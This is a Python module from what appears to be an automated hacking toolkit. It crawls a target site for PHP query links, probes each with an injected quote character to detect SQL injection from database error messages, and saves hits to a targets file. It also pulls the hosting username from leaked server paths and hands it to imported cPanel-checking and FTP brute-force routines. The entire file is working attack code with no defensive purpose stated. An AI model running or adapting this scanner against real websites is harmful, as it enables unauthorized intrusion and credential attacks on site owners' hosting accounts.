import requests, re
from Exploits import printModule
from Tools import cpanel
from BruteForce import FTPBruteForce

def Exploit(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass
    agent = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
    }
    try:
        GetLink = requests.get('http://' + site, timeout=10, headers=agent)
        urls = re.findall(r'href=[\'"]?([^\'" >]+)', str(GetLink.content))
        if len(urls) != 0:
            return CheckSqliURL(site, urls)
        else:
            pass
    except:
        pass


def CheckSqliURL(site, urls):
    MaybeSqli = []
    for url in urls:
        try:
            if '.php?' in str(url):
                MaybeSqli.append(site + '/' + url)
        except:
            pass
    if len(MaybeSqli) != 0:
        return CheckSqli(MaybeSqli, site)
    else:
        return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')


def CheckSqli(MaybeSqli, site):
    for url in MaybeSqli:
        try:
            error = ["DB Error", "SQL syntax;", "mysql_fetch_assoc", "mysql_fetch_array", "mysql_num_rows",
                     "is_writable",
                     "mysql_result", "pg_exec", "mysql_result", "mysql_num_rows", "mysql_query", "pg_query",
                     "System Error",
                     "io_error", "privilege_not_granted", "getimagesize", "preg_match", "mysqli_result", 'mysqli']

            if url.startswith("http://"):
                url = url.replace("http://", "")
            elif url.startswith("https://"):
                url = url.replace("https://", "")
            else:
                pass
            agent = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
            }
            for s in error:
                Checksqli = requests.get('http://' + url + "'", timeout=5, headers=agent)
                if s in str(Checksqli.content):
                    SQLI = url.replace("'", "")
                    if SQLI.startswith("http://"):
                        SQLI = SQLI.replace("http://", "")
                    elif SQLI.startswith("https://"):
                        SQLI = SQLI.replace("https://", "")
                    else:
                        pass
                    if 'http://' in SQLI:
                        pass
                    else:
                        with open('result/SqlInjection_targets.txt', 'a') as xx:
                            xx.write('http://' + SQLI + '\n')
                        try:
                            Username = re.findall('/home/(.*)/public_html/', str(Checksqli.content))[0]
                            cpanel.Check(site, Username, 'Cpanel')
                            FTPBruteForce.CheckFTPport(site, Username)
                        except:
                            pass
                    return printModule.returnYes(SQLI, 'N/A', 'Sql Injection', 'unknown')
                else:
                    pass
            break
        except:
            pass

